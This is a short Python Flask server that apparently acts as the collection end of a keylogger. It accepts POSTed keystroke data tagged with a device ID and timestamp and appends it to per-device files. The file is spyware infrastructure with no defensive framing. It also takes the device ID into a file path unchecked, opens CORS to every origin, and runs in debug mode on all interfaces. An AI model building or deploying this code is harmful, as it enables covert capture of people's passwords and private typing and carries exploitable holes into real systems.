from flask import Flask, request, jsonify
from flask_cors import CORS  # Import CORS
import os
import json

app = Flask(__name__)
CORS(app)  # Enable CORS for all domains

# Directory to save keystrokes
SAVE_DIR = "keystrokes"
os.makedirs(SAVE_DIR, exist_ok=True)

@app.route("/save-keystrokes", methods=["POST"])
def save_keystrokes():
    data = request.get_json()

    # Extract device ID and keystrokes
    device_id = data.get("deviceId", "unknown_device")
    timestamp = data.get("timestamp", "unknown_time")
    keystrokes = data.get("data", {})

    # Save to a file named after the device ID
    file_path = os.path.join(SAVE_DIR, f"{device_id}.txt")
    with open(file_path, "a") as f:
        f.write(f"Timestamp: {timestamp}\n")
        f.write(json.dumps(keystrokes, indent=2))
        f.write("\n\n")

    return jsonify({"status": "success", "message": "Keystrokes saved"}), 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)  # Listen on all interfaces
